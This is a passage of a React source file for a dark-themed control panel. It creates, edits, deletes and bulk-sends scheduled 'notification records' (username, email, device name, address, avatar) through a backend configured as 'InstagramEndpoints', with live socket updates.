      {error && <p className="mt-1 text-xs text-red-400">{error}</p>}
    </div>
  );
}
const inputCls = (err) =>
  `w-full rounded-lg border px-3 py-2 text-sm text-[#a0bce0] bg-[#0b1527] placeholder:text-[#3a5a8a] focus:outline-none focus:ring-2 focus:ring-[#3d7aba] ${err ? "border-red-400" : "border-[#1e3260]"}`;

function RecordModal({ mode, record, onClose, onSave }) {
  const adv = mode === "advance";
  const editing = !!record;
  const [entries, setEntries] = useState(
    editing
      ? [{ ...blank(), ...record, deviceName: record.deviceName || DEFAULT_DEVICE, address: record.address || DEFAULT_ADDRESS }]
      : [blank()]
  );
  const [errors, setErrors] = useState({});
  const [formError, setFormError] = useState("");
  const [saving, setSaving] = useState(false);

  const set = (k, field, v) => {
    setFormError("");
    setEntries((es) => es.map((e) => (e._k === k ? { ...e, [field]: v } : e)));
  };
  const pickFile = (k, file) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => set(k, "avatar", reader.result);
    reader.readAsDataURL(file);
  };

  const validate = () => {
    const errs = {};
    const seenEmails = new Set();
    entries.forEach((e) => {
      const x = {};
      const em = e.email.trim().toLowerCase();
      if (!e.email.trim()) {
        x.email = "Email is required";
      } else if (!/^\S+@\S+\.\S+$/.test(e.email)) {
        x.email = "Enter a valid email";
      } else if (seenEmails.has(em)) {
        x.email = "Duplicate email in entries";
      }
      if (em) seenEmails.add(em);

      if (!e.deviceName.trim()) x.deviceName = "Device name is required";
      if (!e.address.trim()) x.address = "Address is required";
      if (adv) {
        if (!e.username.trim()) x.username = "Username is required";
        if (!e.avatar) x.avatar = "Profile picture is required";
      }
      if (Object.keys(x).length) errs[e._k] = x;
    });
    setErrors(errs);
    return !Object.keys(errs).length;
  };

  const save = async () => {
    setFormError("");
    if (!validate()) return;
    setSaving(true);
    const err = await onSave(entries);
    setSaving(false);
    if (err) {
      setFormError(err);
      return;
    }
    onClose();
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4" role="dialog" aria-modal="true">
      <div className="flex max-h-full w-full max-w-lg flex-col rounded-2xl bg-[#0b1527] border border-[#1e3260] shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#1e3260] px-5 py-4">
          <h2 className="flex items-center gap-2 text-base font-semibold text-[#a0bce0]">
            {adv && <I.Crown className="w-5 h-5 text-[#e8c97a]" />}
            {editing ? (adv ? "Edit advance data" : "Edit simple data") : adv ? "Add new advance data" : "Add new simple data"}
          </h2>
          <button onClick={onClose} disabled={saving} aria-label="Close" className="rounded-lg p-1.5 text-[#3a5a8a] hover:bg-[#0f1e38] disabled:opacity-50 cursor-pointer">
            <I.Close className="w-5 h-5" />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto px-5 py-4 space-y-4">
          {formError && (
            <div className="flex items-center gap-2 rounded-lg border border-red-500/40 bg-red-500/10 px-3 py-2 text-xs font-medium text-red-400">
              <I.Close className="w-4 h-4 shrink-0" />
              <span>{formError}</span>
            </div>
          )}
          {entries.map((e, i) => {
            const er = errors[e._k] || {};
            return (
              <div key={e._k} className="rounded-xl border border-[#1e3260] bg-[#060d1c]/30 p-4 space-y-3">
                {entries.length > 1 && (
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-[#3a5a8a]">Entry {i + 1}</span>
                    <button onClick={() => setEntries(entries.filter((x) => x._k !== e._k))} aria-label="Remove entry" className="text-[#3a5a8a] hover:text-red-400 cursor-pointer">
                      <I.Trash />
                    </button>
                  </div>
                )}
                <Field label="Username" required={adv} error={er.username}>
                  <input className={inputCls(er.username)} value={e.username} onChange={(ev) => set(e._k, "username", ev.target.value)} placeholder="e.g. aarav_k" />
                </Field>
                <Field label="Email" required error={er.email}>
                  <input type="email" className={inputCls(er.email)} value={e.email} onChange={(ev) => set(e._k, "email", ev.target.value)} placeholder="name@company.com" />
                </Field>
                <Field label="Device name" required error={er.deviceName}>
                  <input className={inputCls(er.deviceName)} value={e.deviceName} onChange={(ev) => set(e._k, "deviceName", ev.target.value)} placeholder="e.g. Redmi Note 12" />
                </Field>
                <Field label="Address" required error={er.address}>
                  <input className={inputCls(er.address)} value={e.address} onChange={(ev) => set(e._k, "address", ev.target.value)} placeholder="City, country" />
                </Field>
                {adv && (
                  <Field label="Profile picture" required error={er.avatar}>
                    <div className="flex items-center gap-3">
                      <Avatar src={e.avatar} premium />
                      <label className="inline-flex cursor-pointer items-center gap-2 rounded-lg border border-[#1e3260] bg-[#0b1527] px-3 py-2 text-sm text-[#6ab0ff] hover:bg-[#0f1e38]">
                        <I.Upload /> {e.avatar ? "Change image" : "Upload image"}
                        <input type="file" accept="image/*" className="hidden" onChange={(ev) => pickFile(e._k, ev.target.files[0])} />
                      </label>
                    </div>
                  </Field>
                )}
              </div>
            );
          })}
          {!editing && (
            <button
              onClick={() => setEntries([...entries, blank()])}
              className="inline-flex items-center gap-2 rounded-lg border border-dashed border-[#1e3260] px-3 py-2 text-sm text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#6ab0ff] cursor-pointer"
            >
              <I.Plus /> Add another entry
            </button>
          )}
        </div>

        <div className="flex justify-end gap-2 border-t border-[#1e3260] px-5 py-3">
          <Btn onClick={onClose} disabled={saving} className="border border-[#1e3260] bg-[#0b1527] text-[#a0bce0] hover:bg-[#0f1e38] cursor-pointer">Cancel</Btn>
          <Btn onClick={save} loading={saving} className="bg-[#3d7aba] text-white hover:bg-[#2d6aa0] cursor-pointer">{saving ? "Saving" : "Save"}</Btn>
        </div>
      </div>
    </div>
  );
}

/* ---------- seed data: ONE array for simple + advance ---------- */
const defaultNotify = () => ({ notifyType: SEND_TYPES[0], schedule: false, scheduledAt: "", pendingId: null });

/* ---------- main ---------- */
export default function ControlPanel() {
  const [records, setRecords] = useState([]);
  const [filter, setFilter] = useState("all");
  const [selected, setSelected] = useState([]);
  const [modal, setModal] = useState(null); // { mode, record }
  const [deletingIds, setDeletingIds] = useState([]);
  const [bulkDeleting, setBulkDeleting] = useState(false);
  const [bulkSending, setBulkSending] = useState(false);
  const [bulkResult, setBulkResult] = useState(null);
  const [loading, setLoading] = useState(true);
  const [confirmDelete, setConfirmDelete] = useState(null); // { type: "bulk" | "single", count?: number, id?: string, title?: string }

  // Load records from API
  const loadRecords = async () => {
    setLoading(true);
    try {
      const url = filter === "all" 
        ? `${InstagramEndpoints.backendBaseUrl}/api/notification-records`
        : `${InstagramEndpoints.backendBaseUrl}/api/notification-records?type=${filter}`;
      
      const response = await fetch(url);
      const data = await response.json();
      
      if (data.status === "SUCCESS") {
        setRecords((data.data.records || []).map(r => ({
          ...r,
          notify: r.notify || defaultNotify()
        })));
      }
    } catch (err) {
      console.error("Error loading records:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadRecords();
  }, [filter]);

  // WebSocket for real-time updates
  useEffect(() => {
    const socket = io(InstagramEndpoints.backendBaseUrl, {
      transports: ["websocket", "polling"],
    });

    socket.on("notificationRecordCreated", (record) => {
      setRecords((prev) => {
        if (prev.some((r) => r.id === record.id)) return prev;
        return [{ ...record, notify: record.notify || defaultNotify() }, ...prev];
      });
    });

    socket.on("notificationRecordUpdated", (record) => {
      setRecords((prev) => prev.map((r) => (r.id === record.id ? { ...record, notify: record.notify || defaultNotify() } : r)));
    });

    socket.on("notificationRecordDeleted", ({ id }) => {
      setRecords((prev) => prev.filter((r) => r.id !== id));
      setSelected((prev) => prev.filter((x) => x !== id));
    });

    socket.on("notificationRecordsDeleted", ({ ids }) => {
      const idSet = new Set(ids);
      setRecords((prev) => prev.filter((r) => !idSet.has(r.id)));
      setSelected((prev) => prev.filter((x) => !idSet.has(x)));
    });

    return () => socket.disconnect();
  }, []);

  const refresh = async () => {
    setLoading(true);
    setSelected([]);
    await delay();
    await loadRecords();
  };

  const visible = useMemo(() => records.filter((r) => filter === "all" || r.type === filter), [records, filter]);
  const selectedVisible = visible.filter((r) => selected.includes(r.id));
  const allChecked = visible.length > 0 && selectedVisible.length === visible.length;

  const toggleAll = () =>
    setSelected(allChecked ? selected.filter((id) => !visible.some((r) => r.id === id)) : [...new Set([...selected, ...visible.map((r) => r.id)])]);
  const toggleOne = (id) => setSelected((s) => (s.includes(id) ? s.filter((x) => x !== id) : [...s, id]));

  const deleteOne = async (id) => {
    setDeletingIds((d) => [...d, id]);
    try {
      const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/delete`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      const data = await res.json();
      if (data.status === "SUCCESS") {
        setRecords((prev) => prev.filter((r) => r.id !== id));
        setSelected((prev) => prev.filter((x) => x !== id));
      }
    } catch (err) {
      console.error("Error deleting:", err);
    } finally {
      setDeletingIds((d) => d.filter((x) => x !== id));
    }
  };

  const bulkDelete = async () => {
    setBulkDeleting(true);
    try {
      const ids = selectedVisible.map((r) => r.id);
      if (ids.length === 0) return;
      const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/bulk/delete`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ids }),
      });
      const data = await res.json();
      if (data.status === "SUCCESS") {
        const idSet = new Set(ids);
        setRecords((prev) => prev.filter((r) => !idSet.has(r.id)));
      }
      // Clear selection after delete
      setSelected([]);
    } catch (err) {
      console.error("Error bulk deleting:", err);
    } finally {
      setBulkDeleting(false);
    }
  };

  const canSendRow = (r) => {
    const n = r.notify;
    // Skip if already scheduled/pending
    const pending = !!n.pendingId && !!n.scheduledAt && new Date(n.scheduledAt).getTime() > Date.now();
    // Skip if schedule is enabled but time is invalid
    const cantSend = n.schedule && (!n.scheduledAt || new Date(n.scheduledAt).getTime() <= Date.now());
    return !pending && !cantSend;
  };

  const sendAll = async () => {
    const targets = selectedVisible.filter(canSendRow);
    const skipped = selectedVisible.length - targets.length;
    if (!targets.length) {
      setBulkResult({ sent: 0, scheduled: 0, skipped });
      return;
    }
    
    setBulkSending(true);
    
    // Send each target notification
    let sentCount = 0;
    let scheduledCount = 0;
    
    for (const r of targets) {
      try {
        // If the item has schedule enabled with future time, add pendingId
        if (r.notify.schedule && r.notify.scheduledAt) {
          const pendingId = `pending-${Date.now()}-${r.id}`;
          const updatedNotify = { ...r.notify, pendingId };
          
          // Update with pendingId first
          await updateNotify(r.id, updatedNotify);
          
          // Then send with the updated notify
          await sendNotification(r.id, updatedNotify);
          scheduledCount++;
        } else {
          // Send immediately (no schedule)
          await sendNotification(r.id);
          sentCount++;
        }
        
        await delay(300); // Small delay between sends
      } catch (err) {
        console.error(`Error sending notification for ${r.id}:`, err);
      }
    }
    
    setBulkSending(false);
    // Clear selection after send all
    setSelected([]);
    setBulkResult({ sent: sentCount, scheduled: scheduledCount, skipped });
  };

  const handleSave = async (entries) => {
    try {
      if (modal.record) {
        const e = entries[0];
        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/update`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: modal.record.id,
            type: modal.mode,
            username: e.username,
            email: e.email,
            avatar: e.avatar,
            deviceName: e.deviceName,
            address: e.address
          }),
        });
        const data = await res.json();
        if (!res.ok || data.status === "FAILURE") {
          return data.message || "Failed to update record";
        }
      } else {
        const recordsToCreate = entries.map((e) => ({
          type: modal.mode, username: e.username, email: e.email, avatar: e.avatar, deviceName: e.deviceName, address: e.address,
        }));
        if (recordsToCreate.length === 1) {
          const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/create`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(recordsToCreate[0]),
          });
          const data = await res.json();
          if (!res.ok || data.status === "FAILURE") {
            return data.message || "Failed to create record";
          }
        } else {
          const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/bulk`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ records: recordsToCreate }),
          });
          const data = await res.json();
          if (!res.ok || data.status === "FAILURE") {
            return data.message || "Failed to create bulk records";
          }
        }
      }
      return null;
    } catch (err) {
      console.error("Error saving:", err);
      return err.message || "Network error while saving";
    }
  };

  const updateNotify = async (id, notify) => {
    // Update local state immediately
    setRecords((rs) =>
      rs.map((r) =>
        r.id !== id ? r : { ...r, notify }
      )
    );
    
    // Save to backend with ID in request body
    try {
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/update`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, notify }),
      });
    } catch (err) {
      console.error("Error updating notify:", err);
    }
  };

  const sendNotification = async (id, notifyToSend = null) => {
    try {
      const record = records.find(r => r.id === id);
      const notifyData = notifyToSend || record.notify;
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, notify: notifyData }),
      });
    } catch (err) {
      console.error("Error sending:", err);
    }
  };

  const cancelSchedule = async (id) => {
    try {
      const record = records.find(r => r.id === id);
      
      // Clear schedule and pendingId from notify
      const updatedNotify = {
        ...record.notify,
        schedule: false,
        scheduledAt: "",
        pendingId: null
      };
      
      // Update in backend with ID in request body
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/update`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, notify: updatedNotify }),
      });
      
      // Update local state
      setRecords((rs) =>
        rs.map((r) =>
          r.id === id
            ? { ...r, notify: updatedNotify }
            : r
        )
      );
    } catch (err) {
      console.error("Error cancelling:", err);
    }
  };

  return (
    <div className="h-screen flex flex-col bg-[#060d1c] text-[#a0bce0] font-sans">
      {/* Header (static) */}
      <header className="shrink-0 flex flex-wrap items-center justify-between gap-2 border-b border-[#131e35] bg-[#080f1e] px-3 py-2">
        <div className="flex items-center gap-2">
          <FilterDropdown value={filter} onChange={setFilter} />
          <button
            onClick={refresh}
            disabled={loading}
            title="Refresh"
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            <I.Refresh className={`w-3 h-3 ${loading ? "animate-spin" : ""}`} /> Refresh
          </button>
        </div>
        <div className="flex items-center gap-2">
          <Btn onClick={() => setModal({ mode: "simple", record: null })} className="border border-[#3d7aba] bg-[#3d7aba]/10 text-[#6ab0ff] hover:bg-[#3d7aba]/20 cursor-pointer !h-7 !px-2.5 !text-[11px]">
            <I.Plus className="w-3 h-3" /> Add simple
          </Btn>
          <Btn onClick={() => setModal({ mode: "advance", record: null })} className="bg-gradient-to-r from-amber-500 to-yellow-600 text-white hover:from-amber-600 hover:to-yellow-700 cursor-pointer !h-7 !px-2.5 !text-[11px]">
            <I.Crown className="w-3 h-3" /> Add advance
          </Btn>
        </div>
      </header>

      {/* Body (scrollable, fills remaining screen height) */}
      <main className="flex-1 overflow-y-auto px-3 py-2">
        {loading ? (
          <div className="rounded-xl border border-[#131e35] bg-[#0b1527]" role="status" aria-live="polite">
            <div className="flex h-8 items-center border-b border-[#131e35] bg-[#060d1c] px-3">
              <div className="h-3 w-24 animate-pulse rounded bg-[#1e3260]" />
            </div>
            {[0, 1, 2].map((i) => (
              <div key={i} className="flex items-center gap-2 border-b border-[#131e35] px-3 py-2 last:border-0">
                <div className="h-4 w-4 animate-pulse rounded bg-[#1e3260]" />
                <div className="h-8 w-8 animate-pulse rounded-full bg-[#1e3260]" />
                <div className="flex-1 space-y-1">
                  <div className="h-3 w-1/4 animate-pulse rounded bg-[#1e3260]" />
                  <div className="h-3 w-2/5 animate-pulse rounded bg-[#131e35]" />
                </div>
                <div className="h-6 w-40 animate-pulse rounded-lg bg-[#131e35]" />
              </div>
            ))}
            <div className="flex items-center justify-center gap-2 py-8 text-[11px] text-[#6b8cba]">
              <I.Spinner className="w-3 h-3 text-[#3d7aba]" /> Loading records
            </div>
          </div>
        ) : (
          <div className="rounded-xl border border-[#131e35] bg-[#0b1527]">
            {visible.length === 0 ? (
              <p className="px-3 py-12 text-center text-[12px] text-[#6b8cba]">No records here yet. Use the buttons above to add one.</p>
            ) : (
              <>
                {/* list header */}
                <div className="sticky top-0 z-10 flex min-h-[2rem] items-center gap-2 rounded-t-xl border-b border-[#131e35] bg-[#060d1c] px-3 py-1">
                  <Checkbox checked={allChecked} indeterminate={!allChecked && selectedVisible.length > 0} onChange={toggleAll} />
                  <span className="flex-1 text-[11px] text-[#6b8cba]">
                    {selectedVisible.length ? `${selectedVisible.length} of ${visible.length} selected` : `${visible.length} records`}
                  </span>
                  {selectedVisible.length > 0 && (
                    <div className="flex items-center gap-2">
                      <button
                        onClick={sendAll}
                        disabled={bulkSending || bulkDeleting}
                        className="flex items-center gap-1.5 rounded border border-[#3d7aba] bg-[#3d7aba]/10 px-2 py-1 text-[11px] text-[#6ab0ff] hover:bg-[#3d7aba]/20 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                      >
                        {bulkSending ? <I.Spinner className="w-3 h-3" /> : <I.Send className="w-3 h-3" />} Send all
                      </button>
                      <button
                        onClick={() => setConfirmDelete({ type: "bulk", count: selectedVisible.length })}
                        disabled={bulkDeleting || bulkSending}
                        className="flex items-center gap-1.5 rounded border border-red-500/40 bg-red-500/10 px-2 py-1 text-[11px] text-red-400 hover:bg-red-500/20 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                      >
                        {bulkDeleting ? <I.Spinner className="w-3 h-3" /> : <I.Trash className="w-3 h-3" />} Delete
                      </button>
                    </div>
                  )}
                </div>

                {/* rows */}
                {visible.map((r) => (
                  <Row
                    key={r.id}
                    r={r}
                    selected={selected.includes(r.id)}
                    onSelect={() => toggleOne(r.id)}
                    onEdit={() => setModal({ mode: r.type, record: r })}
                    onDelete={() => setConfirmDelete({ type: "single", id: r.id, title: r.username || r.email })}
                    deleting={deletingIds.includes(r.id)}
                    onNotify={(n) => updateNotify(r.id, n)}
                    onSend={(notifyData) => sendNotification(r.id, notifyData)}
                    onCancel={() => cancelSchedule(r.id)}
                  />
                ))}
              </>
            )}
          </div>
        )}
      </main>

      {modal && <RecordModal mode={modal.mode} record={modal.record} onClose={() => setModal(null)} onSave={handleSave} />}
      {bulkResult && <BulkSentModal info={bulkResult} onClose={() => setBulkResult(null)} />}
      {confirmDelete && (
        <ConfirmDeleteModal
          count={confirmDelete.count}
          title={confirmDelete.title}
          onConfirm={async () => {
            if (confirmDelete.type === "bulk") {
              await bulkDelete();
            } else if (confirmDelete.type === "single") {
              await deleteOne(confirmDelete.id);
            }
          }}
          onClose={() => setConfirmDelete(null)}
        />
      )}
    </div>
  );
}
